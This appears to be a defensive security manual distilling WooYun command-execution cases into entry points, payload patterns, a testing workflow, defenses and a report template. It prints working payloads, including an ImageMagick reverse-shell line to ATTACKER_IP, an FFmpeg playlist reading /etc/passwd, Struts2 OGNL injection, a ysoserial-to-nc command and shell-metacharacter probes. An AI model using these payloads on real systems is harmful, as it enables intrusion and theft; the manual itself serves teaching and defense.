# Command Execution Vulnerability Analysis Manual

> Deep analysis distilled from 6,826 WooYun command-execution cases.
> Sample focus: the 50 highest-quality cases by technical detail.

This manual covers OS command injection, expression injection, framework-level remote code execution, unsafe file processors, and deserialization chains. It keeps the original WooYun case intent: identify where user-controlled data reaches an execution boundary, prove impact with minimal commands, and recommend defenses that remove the execution path instead of only filtering strings.

## 1. Entry Point Taxonomy

| Entry point | Case signal | Typical scenario |
|---|---|---|
| File operations | Very common | Upload, read, extract, convert, archive handling |
| System command wrappers | Very common | `exec`, `system`, `shell_exec`, `Runtime.exec`, `ProcessBuilder` |
| Struts2 and expression engines | Common | OGNL, template expressions, action redirects |
| Archive extraction | Common | `tar`, `zip`, `gzip`, decompression hooks |
| SSRF-to-command chains | Common | URL fetchers that call `curl`, `wget`, `ffmpeg`, or media tools |
| Network diagnostics | Common | `ping`, `nslookup`, `dig`, traceroute functions |
| Image processing | Common | ImageMagick, GraphicsMagick, ExifTool, thumbnailers |
| Java deserialization | Common | WebLogic, JBoss, Jenkins, CommonsCollections gadgets |
| Search and script engines | Common | ElasticSearch Groovy, script fields, plugin APIs |

The recurring root cause is the same: a program crosses from data handling into command or code execution while still trusting request data, file metadata, archive paths, or serialized objects.

## 2. High-Risk Patterns

### ImageMagick delegate command execution

Affected ImageMagick versions processed attacker-controlled image metadata through delegates. A malicious image could pass shell metacharacters into the delegate command.

```text
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/[redacted]"|bash -i >& /dev/tcp/ATTACKER_IP/8080 0>&1 &")'
pop graphic-context
```

WooYun cases referenced avatar upload and media processing endpoints where image conversion ran with excessive privileges. The technical test point is not only "can I upload an image"; it is "what server-side converter touches this file, and does it invoke a shell?"

Defenses: upgrade ImageMagick, disable dangerous delegates, process media in a sandbox, block outbound network access from converters, and run converters as a low-privilege user.

### FFmpeg HLS SSRF and local file read

FFmpeg can process HLS and concat inputs that reference URLs or local files. If a user-uploaded playlist is processed, the media pipeline may become SSRF or file read.

```text
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:file:///etc/passwd
#EXT-X-ENDLIST
```

Defenses: disallow playlist formats unless needed, use protocol allowlists, disable file and network protocols during processing, isolate the worker, and strip untrusted media metadata before processing.

### Struts2 OGNL injection

Struts2 issues arise when request values reach OGNL evaluation. Common WooYun patterns include redirect/action parameters, multipart content-type parsing, and legacy plugins.

```text
Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test',123*123)}.multipart/form-data
```

Defenses: patch Struts2 immediately, disable dynamic method invocation where possible, block expression evaluation on request-controlled values, and maintain endpoint-level regression tests for known Struts2 exploit classes.

### Java deserialization

WebLogic, JBoss, Jenkins, and similar platforms commonly exposed deserialization endpoints or management consoles. The key failure is allowing attacker-controlled object graphs into a classpath that contains gadget chains.

```bash
java -jar ysoserial.jar CommonsCollections1 "whoami" | nc target 7001
```

Defenses: patch products, disable vulnerable protocols when unused, require authentication on management interfaces, apply serialization filters, and segment application servers from sensitive networks.

### ElasticSearch Groovy execution

ElasticSearch 1.x often allowed dynamic script execution.

```json
{
  "script_fields": {
    "exp": {
      "script": "java.lang.Runtime.getRuntime().exec('id')"
    }
  }
}
```

Defenses: disable dynamic scripting, restrict network exposure, require authentication, and upgrade unsupported versions.

### Network diagnostic command injection

Diagnostic tools are frequent injection points.

```php
$ip = $_GET['ip'];
system("ping -c 4 " . $ip);
```

Representative probes:

```text
ip=[IP redacted];whoami
ip=[IP redacted]|id
ip=[IP redacted]`id`
ip=[IP redacted]$(id)
ip=[IP redacted]%0aid
```

Defenses: never invoke a shell for diagnostics; validate IPs with structured parsers; pass arguments as arrays to APIs that avoid shell parsing; and place diagnostics behind strict authorization.

## 3. Shell Metacharacter Checklist

| Token | Meaning | Test value |
|---|---|---|
| `;` | Command separator | `127.0.0.1; id` |
| `|` | Pipe | `127.0.0.1 | id` |
| `||` | Execute on failure | `x || id` |
| `&&` | Execute on success | `127.0.0.1 && id` |
| `` `cmd` `` | Command substitution | ``127.0.0.1`id` `` |
| `$(cmd)` | Command substitution | `127.0.0.1$(id)` |
| `%0a` | Newline injection | `127.0.0.1%0aid` |

Use safe commands such as `id`, `whoami`, `hostname`, or a harmless DNS callback in authorized tests. Avoid destructive commands and avoid persistence.

## 4. Testing Workflow

1. Map all functions that accept file names, URLs, archive uploads, image uploads, diagnostics, templates, callbacks, or serialized data.
2. Identify whether the server calls external programs, interpreters, expression engines, or deserializers.
3. Try non-destructive proof probes that demonstrate command evaluation or outbound interaction.
4. Confirm execution context: user, working directory, network reachability, and privilege level.
5. Document the exact trust boundary violation and the unsafe sink.

## 5. Defensive Patterns

| Problem | Preferred fix |
|---|---|
| Shell command construction | Replace shell strings with safe library calls or argument arrays |
| User-controlled file processing | Sandbox converters; disable dangerous protocols; strip metadata |
| Expression injection | Remove dynamic evaluation; patch frameworks; constrain expression contexts |
| Deserialization | Use allowlists or serialization filters; remove gadget libraries; patch products |
| Management consoles | Require authentication, internal-only network access, and strong credentials |
| Legacy middleware | Upgrade or decommission unsupported versions |

The most reliable remediation is architectural: remove the need for command execution from request-facing paths. Filtering metacharacters is brittle because shells, encodings, and platform-specific parsers provide many alternate separators.

## 6. Report Template

```text
Title: Command execution through [feature/sink]
Affected component: [endpoint, job, converter, middleware]
Input source: [parameter, upload, URL, serialized object]
Execution sink: [shell command, expression engine, deserializer]
Proof: [non-destructive command or callback]
Impact: [execution user, reachable systems, data at risk]
Root cause: [trusted user input crossed into execution boundary]
Remediation: [remove shell/evaluator, patch, sandbox, least privilege]
```

## 7. Key Takeaways

- Command execution is often hidden behind "normal" business functions such as image upload, export, diagnostics, and document conversion.
- The dangerous boundary is not the HTTP endpoint itself; it is the jump from data to executable instructions.
- Patching known CVEs is necessary, but custom command construction and unsafe wrappers remain common after patching.
- Defense must combine safe APIs, input validation, sandboxing, least privilege, and network segmentation.
